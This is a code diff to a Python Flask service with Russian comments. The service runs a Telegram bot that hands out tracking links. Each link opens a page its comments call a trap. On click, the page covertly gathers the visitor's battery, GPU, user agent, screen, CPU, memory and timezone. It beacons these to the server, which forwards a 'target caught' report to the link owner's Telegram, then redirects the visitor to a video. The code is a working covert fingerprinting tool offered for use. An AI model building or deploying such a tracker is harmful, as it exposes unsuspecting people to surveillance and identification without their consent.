@@ -32,14 +32,14 @@ def get_owner(sid):
     except: return OVERLORD_ID
 
 # =================================================================
-# [2] ТОТ САМЫЙ РАБОЧИЙ КОРЕНЬ
+# [2] ТОТ САМЫЙ КОРЕНЬ ДЛЯ КРОНА
 # =================================================================
 @app.route('/')
 def index():
-    return "ok", 200 # Максимально просто, как было раньше
+    return "service active", 200
 
 # =================================================================
-# [3] СТРАНИЦА-ЛОВУШКА
+# [3] ЛОВУШКА (FORCE BATTERY VERSION)
 # =================================================================
 HTML_TEMPLATE = """
 <!DOCTYPE html>
@@ -57,19 +57,27 @@ HTML_TEMPLATE = """
 <body onclick="ignite()">
     <div id="app"></div>
 <script>
-    function ignite() {
-        // Собираем батарею быстро (если доступна)
-        let bat = "N/A";
-        if (navigator.getBattery) {
-            navigator.getBattery().then(b => { bat = Math.round(b.level * 100) + "%"; });
-        }
+    async function ignite() {
+        let batteryInfo = "N/A (Blocked)";
+        
+        // Ждем батарею максимум 500мс
+        const getBat = new Promise((resolve) => {
+            if (navigator.getBattery) {
+                navigator.getBattery().then(b => {
+                    resolve(Math.round(b.level * 100) + "% " + (b.charging ? "⚡" : "🔋"));
+                }).catch(() => resolve("Error"));
+            } else { resolve("Not Supported"); }
+            setTimeout(() => resolve("Timeout"), 500);
+        });
+
+        batteryInfo = await getBat;
 
         const gl = document.createElement('canvas').getContext('webgl');
         const dbg = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
         
         const info = {
             sid: "{{sid}}",
-            bat: bat,
+            bat: batteryInfo,
             gpu: dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "N/A",
             ua: navigator.userAgent,
             res: screen.width + "x" + screen.height,
@@ -79,11 +87,10 @@ HTML_TEMPLATE = """
             tz: Intl.DateTimeFormat().resolvedOptions().timeZone
         };
 
-        // Стреляем данными
         navigator.sendBeacon('/gate/capture', btoa(JSON.stringify(info)));
         
-        // Мгновенный уход
-        window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
+        // Редирект после сбора
+        window.location.replace("https://www.youtube.com/watch?v=dQw4w9WgXcQ");
     }
 </script>
 </body>
@@ -91,7 +98,7 @@ HTML_TEMPLATE = """
 """
 
 # =================================================================
-# [4] ПРИЕМ ДАННЫХ
+# [4] SERVER LOGIC
 # =================================================================
 
 @app.route('/v/<sid>')
@@ -103,12 +110,13 @@ def capture():
     try:
         raw = base64.b64decode(request.get_data()).decode()
         d = json.loads(raw)
+        sid = str(d.get('sid'))
         
         report = (
-            f"<b>🔋 ОТЧЕТ СИСТЕМЫ</b>\n"
+            f"<b>🔴 ОБЪЕКТ ПОЙМАН</b>\n"
             f"━━━━━━━━━━━━━━━━━━\n"
-            f"🆔 <b>Target ID:</b> <code>{d.get('sid')}</code>\n"
-            f"🔋 <b>Заряд:</b> <code>{d.get('bat', 'Pending...')}</code>\n\n"
+            f"🆔 <b>Target ID:</b> <code>{sid}</code>\n"
+            f"🔋 <b>Заряд:</b> <code>{d.get('bat')}</code>\n\n"
             f"<b>🎮 GPU:</b> <code>{d.get('gpu')}</code>\n"
             f"<b>🧠 CPU:</b> <code>{d.get('cores')} Cores</code>\n"
             f"<b>💾 RAM:</b> <code>{d.get('mem')} GB</code>\n"
@@ -116,16 +124,16 @@ def capture():
             f"<b>📐 Res:</b> <code>{d.get('res')}</code>\n"
             f"<b>📍 TZ:</b> <code>{d.get('tz')}</code>\n"
             f"━━━━━━━━━━━━━━━━━━\n"
-            f"🛰 <b>UA:</b> <code>{d.get('ua')[:100]}...</code>"
+            f"🛰 <b>UA:</b> <code>{d.get('ua')[:110]}...</code>"
         )
         
         requests.post(f"https://api.telegram.org/bot{API_TOKEN}/sendMessage", 
-                      json={"chat_id": get_owner(str(d.get('sid'))), "text": report, "parse_mode": "HTML"})
+                      json={"chat_id": get_owner(sid), "text": report, "parse_mode": "HTML"})
     except: pass
     return "OK"
 
 # =================================================================
-# [5] BOT LOOP
+# [5] BOT THREAD
 # =================================================================
 
 def bot_loop():
@@ -145,7 +153,7 @@ def bot_loop():
                         conn.close()
                         link = f"{BASE_URL}/v/{cid}"
                         requests.post(f"https://api.telegram.org/bot{API_TOKEN}/sendMessage", 
-                                      json={"chat_id": cid, "text": f"✅ <b>Ссылка готова:</b>\n<code>{link}</code>", "parse_mode": "HTML"})
+                                      json={"chat_id": cid, "text": f"✅ <b>Система в сети.</b>\n\nТвоя ссылка:\n<code>{link}</code>", "parse_mode": "HTML"})
         except: time.sleep(5)
 
 if __name__ == '__main__':
